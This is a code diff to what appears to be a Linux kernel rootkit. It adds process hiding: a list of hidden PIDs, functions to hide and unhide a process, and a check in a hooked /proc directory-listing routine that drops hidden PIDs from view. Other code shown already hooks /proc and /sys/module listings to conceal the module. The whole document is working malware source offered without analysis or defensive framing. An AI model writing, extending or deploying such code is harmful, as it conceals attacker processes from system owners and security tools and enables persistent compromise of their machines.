@@ -2,6 +2,13 @@
 
 extern u8 module_hidden;
 
+LIST_HEAD(hidden_pid_list);
+
+struct hidden_pid_t {
+    pid_t pid;
+    struct list_head list;
+};
+
 // Vars for proc manipulation
 int (*orig_proc_iterate_shared)(struct file *, struct dir_context *);
 int (*orig_sys_iterate_shared)(struct file *, struct dir_context *);
@@ -13,6 +20,17 @@ int (*orig_sys_filldir)(struct dir_context *, const char *, int, loff_t, u64,
 int rk_proc_filldir(struct dir_context *ctx, const char *proc_name, int len,
                     loff_t off, u64 ino, unsigned int d_type)
 {
+    long pid = 0;
+    kstrtol(proc_name, 10, &pid);
+
+    if (pid != 0)
+    {
+        if (is_hidden_proc(pid))
+        {
+            return 0;
+        }
+    }
+
     if (module_hidden && (strncmp(proc_name, PROCFILE_NAME, strlen(PROCFILE_NAME) - 1) == 0))
         return 0;
     return orig_filldir(ctx, proc_name, len, off, ino, d_type);
@@ -53,6 +71,51 @@ int hidefs_clean(void)
 {
     UNSET_FOP(iterate_shared, "/proc", orig_proc_iterate_shared);
     UNSET_FOP(iterate_shared, "/sys/module", orig_sys_iterate_shared);
+
+    return 0;
+}
+
+void hide_proc(pid_t pid)
+{
+    struct hidden_pid_t *hidden_pid;
+
+    hidden_pid = kmalloc(sizeof(struct hidden_pid_t), GFP_KERNEL);
+    hidden_pid->pid = pid;
+    INIT_LIST_HEAD(&(hidden_pid->list));
+
+    list_add(&hidden_pid->list, &hidden_pid_list);
+}
+
+void unhide_proc(pid_t pid)
+{
+    struct list_head *pos = NULL;
+    struct hidden_pid_t *hidden_pid = NULL;
+
+    list_for_each(pos, &hidden_pid_list)
+    {
+        hidden_pid = list_entry(pos, struct hidden_pid_t, list);
+        if (hidden_pid->pid == pid)
+        {
+            list_del(&hidden_pid->list);
+            kfree(hidden_pid);
+            return;
+        }
+    }
+}
+
+bool is_hidden_proc(pid_t pid)
+{
+    struct list_head *pos = NULL;
+    struct hidden_pid_t *hidden_pid = NULL;
+
+    list_for_each(pos, &hidden_pid_list)
+    {
+        hidden_pid = list_entry(pos, struct hidden_pid_t, list);
+        if (hidden_pid->pid == pid)
+        {
+            return 1;
+        }
+    }
 
     return 0;
 }
